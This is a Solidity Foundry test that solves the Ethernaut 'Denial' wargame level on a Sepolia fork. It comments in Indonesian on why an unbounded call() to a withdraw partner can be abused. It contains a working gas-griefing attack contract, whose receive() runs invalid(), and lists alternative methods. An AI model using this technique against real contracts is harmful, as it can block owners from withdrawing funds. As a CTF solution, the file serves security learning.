// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../21-Denial/DenialFactory.sol";
import "forge-std/Test.sol";

contract DenialAttack is Test {
    function testDenial() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        DenialFactory factory = new DenialFactory();
        ethernaut.registerLevel(factory);
        address korun = makeAddr("korun");
        vm.deal(korun, 10 ether);
        address addr = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        Denial denial = Denial(payable(addr));
        bool adaBalance = denial.contractBalance() != 0;
        assertTrue(adaBalance);
        emit log("Goal: jangan biarkan owner menarik aset");
        emit log(
            "ketika fungsi kontrak mengirim ether ke alamat manapun, maka beban gas yang harus dibayar ada pada kontrak"
        );
        emit log(
            "Transfer - Penarikan ke pemilik menggunakan opcode tranfer, yang mengirimkan gas 2300 tetap dengan panggilan. Ini dirancang untuk menjadi gas yang cukup untuk kontrak penerima untuk memancarkan sebuah peristiwa, tetapi tidak cukup untuk mengeksekusi kode yang kompleks."
        );
        emit log(
            'Penarikan ke mitra menggunakan call opcode, yang memungkinkan jumlah gas yang fleksibel untuk dikirim dengan panggilan. Hal ini memungkinkan kode yang lebih kompleks untuk dieksekusi oleh penerima. Panggilan menentukan tanda tangan fungsi yang mereka panggil, dalam hal ini, ("") menandakan bahwa itu akan mengenai fungsi recieve() atau fallback() penerima.'
        );
        emit log("pertama-tama, kita buat kontrak untuk dijadikan partner");
        PartnerBoros boros = new PartnerBoros(payable(address(denial)));
        denial.setWithdrawPartner(address(boros));
        emit log("ada 3 metode:");
        emit log(
            "1. jika compiler > 0.8, gunakan upcode invalid() pada assembly, sehingga panggilan akan dianggap gagal dan menghabiskan semua gas"
        );
        emit log(
            "2. jika compiler <0.8, bisa memanggil assert(false) pada receive sehingga transaksi akan dibatalkan dan memakan semua gas"
        );
        emit log("3. bisa juga menggunakan infinite loop pada receive() sehingga gas akan habis");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract PartnerBoros {
    Denial denial;

    constructor(address _a) {
        denial = Denial(payable(_a));
    }

    receive() external payable {
        //     while (true) {}
        // }
        assembly {
            invalid()
        }
    }
}
